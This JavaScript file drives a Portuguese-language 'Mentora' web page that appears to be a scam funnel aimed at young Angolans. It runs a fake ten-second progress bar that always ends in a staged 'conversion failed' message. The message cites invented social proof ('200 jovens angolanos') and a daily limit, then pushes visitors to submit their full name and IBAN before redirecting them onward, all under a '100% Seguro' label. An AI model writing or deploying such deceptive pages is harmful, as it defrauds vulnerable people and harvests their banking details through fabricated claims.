(function () {
  "use strict";

  function showIbanForm(main) {
    main.innerHTML = [
      '<section class="rounded-2xl border border-border bg-card/80 p-5 shadow-checkout backdrop-blur-sm">',
      '<div class="text-center">',
      '<h1 class="text-lg font-bold text-foreground">Conversão para IBAN</h1>',
      '<p class="mt-2 text-sm text-muted-foreground">Preencha os dados para concluir o recebimento dos seus ganhos.</p>',
      '</div>',
      '<form id="iban-form" class="mt-5 space-y-4">',
      '<label class="block text-left text-sm font-semibold text-foreground">Nome completo<input name="name" required autocomplete="name" class="mt-1 h-11 w-full rounded-lg border border-border bg-background px-3 text-sm" placeholder="Seu Nome" /></label>',
      '<label class="block text-left text-sm font-semibold text-foreground">IBAN<input name="iban" required minlength="10" autocomplete="off" class="mt-1 h-11 w-full rounded-lg border border-border bg-background px-3 text-sm" placeholder="AO06 0000 0000 0000 0000 0" /></label>',
      '<p id="iban-error" class="hidden text-sm text-destructive" role="alert">Informe um IBAN válido.</p>',
      '<button type="submit" class="h-12 w-full rounded-full bg-primary text-sm font-bold uppercase tracking-wide text-primary-foreground">Confirmar conversão</button>',
      '</form>',
      '</section>',
      '<p class="pb-2 text-center text-[11px] font-semibold text-muted-foreground">© 2026 Mentora — Pagamento 100% Seguro</p>'
    ].join("");

    var form = document.getElementById("iban-form");
    form.addEventListener("submit", function (event) {
      event.preventDefault();
      var iban = form.elements.iban.value.replace(/\s+/g, "");
      var error = document.getElementById("iban-error");
      if (iban.length < 10) {
        error.classList.remove("hidden");
        form.elements.iban.focus();
        return;
      }
      window.location.href = "converter-iban/index.html";
    });
  }

  function start() {
    var main = document.querySelector("main");
    var progress = main && main.querySelector('[role="progressbar"]');
    var fill = progress && progress.firstElementChild;
    var percentage = progress && progress.previousElementSibling && progress.previousElementSibling.lastElementChild;
    if (!main || !progress || !fill || !percentage) return;

    var startedAt = Date.now();
    var duration = 10000;
    var timer = setInterval(function () {
      var value = Math.min(100, ((Date.now() - startedAt) / duration) * 100);
      var rounded = Math.round(value);
      percentage.textContent = rounded + "%";
      progress.setAttribute("aria-valuenow", String(rounded));
      fill.style.width = value + "%";

      if (value >= 100) {
        clearInterval(timer);
        main.innerHTML = '<section class="rounded-2xl border border-destructive/40 bg-card/80 p-5 text-center shadow-checkout backdrop-blur-sm"><div class="mx-auto flex size-12 items-center justify-center rounded-full bg-destructive/15 text-destructive">×</div><h1 class="mt-3 text-lg font-bold text-destructive">Conversão não concluída</h1><p class="mt-2 text-sm text-muted-foreground">Hoje, mais de <strong class="text-foreground">200 jovens angolanos</strong> já converteram os seus ganhos de Pix para Multicaixa Express e atingimos o limite diário de conversões.</p><p class="mt-2 text-sm text-muted-foreground">Para conseguir sacar ainda hoje, é necessário fazer a <strong class="text-foreground">conversão para IBAN</strong>.</p><button id="iban-button" type="button" class="mt-5 h-12 w-full rounded-full bg-primary text-sm font-bold uppercase tracking-wide text-primary-foreground">Converter para IBAN</button></section><p class="pb-2 text-center text-[11px] font-semibold text-muted-foreground">© 2026 Mentora — Pagamento 100% Seguro</p>';
        document.getElementById("iban-button").addEventListener("click", function () { showIbanForm(main); });
      }
    }, 80);
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", start);
  else start();
}());
